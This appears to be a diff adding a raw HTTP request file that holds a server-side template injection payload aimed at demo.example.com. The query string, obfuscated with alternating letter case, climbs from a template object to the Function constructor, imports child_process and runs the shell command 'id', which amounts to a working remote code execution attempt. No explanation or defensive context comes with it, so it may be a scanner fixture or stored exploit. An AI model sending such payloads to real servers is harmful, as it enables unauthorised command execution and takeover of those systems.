@@ -1,0 +1,4 @@
+GET /a?s={{%20rAnGeS.cOnStRuCtOr.CoNsTrUcToR("rEtUrN%20iMpOrT")()('cHiLd_PrOcEsS').eXeC('iD')%20}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
